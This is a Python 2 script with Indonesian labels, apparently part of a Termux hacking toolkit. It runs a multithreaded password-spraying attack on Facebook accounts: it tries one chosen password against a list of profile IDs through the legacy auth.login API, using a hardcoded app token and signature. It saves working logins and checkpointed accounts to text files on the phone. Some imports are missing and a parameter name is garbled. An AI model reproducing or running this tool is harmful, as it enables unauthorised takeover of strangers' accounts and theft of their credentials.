# -*- coding: utf-8 -*-
import sys
from login import logo
sys.path.insert (0, "..")
from warna import *


back = 0
threads = []
berhasil = []
checkpoint = []
gagal = []
def irul():
	global file, id, kata_sandi
	logo()
	id = raw_input (u +"›"+ k +" File Daftar Id Profil "+ n +": ")
	try:
		file = open (id, "r")
		kata_sandi = raw_input (u +"›"+ h +" Kata Sandi "+ n +": ")
		print ""
		for x in range (100):
			irull = threading.Thread (target=acak, args=())
			irull.start ()
			threads.append (irull)
		for irull in threads:
			irull.join ()
	except IOError:
		print m + tebal +"✘ File Id Profil Tidak Ditemukan"
		sleep (5)


def acak():
	global back, berhasil, checkpoint, gagal
	up = open (id, "r").read().split()
	while file:
		username = file.readline().strip()
		at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (username) +"&locale=en_US&kata_sandiord="+ (kata_sandi) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
		if back == (len(up)):
			break
		if "access_token" in at:
			nama = json.loads (get ("https://graph.facebook.com/"+ username +"?access_token="+ at["access_token"]).text)
			berhasil.append (h +"✔ "+ username + u +" | "+ h + kata_sandi + u +" => "+ n + nama["name"])
			kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
			kec.write (username +" | "+ kata_sandi +" => "+ nama["name"] +"\n")
			kec.close ()
		elif "www.facebook.com" in at["error_msg"]:
			checkpoint.append (m +"✘ "+ username + u +" | "+ m + kata_sandi)
			cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
			cek.write (username +" | "+ kata_sandi +"\n")
			cek.close ()
		else:
			gagal.append (username)
			back += 1
		sys.stdout.write (u +"\r• "+ k +"Jumlah Id "+ n +": "+ p + str(back) + n +" => "+ b + str(len(up)) + u +" | "+ h +"✔ "+ n +": "+ h + str(len(berhasil)) + c +" & "+ m +"✘ "+ n +": "+ m + str(len(checkpoint)))
		sys.stdout.flush ()


def hasil():
	print "\n"+ u + 53 * "═"
	for be in berhasil:
		print be
	for ce in checkpoint:
		print ce
	print u +"• "+ m +"Gagal "+ n +": "+ str(len(gagal))
	print u + 53 * "═"
	print h +"✔ "+ k +"Hasilnya Tersimpan Di Memori Internal"
	print b +"  Dengan Nama "+ h + tebal +"Berhasil.txt"+ n +" Dan "+ m + tebal +"Checkpoint.txt"+ n
	enter()


irul()
hasil()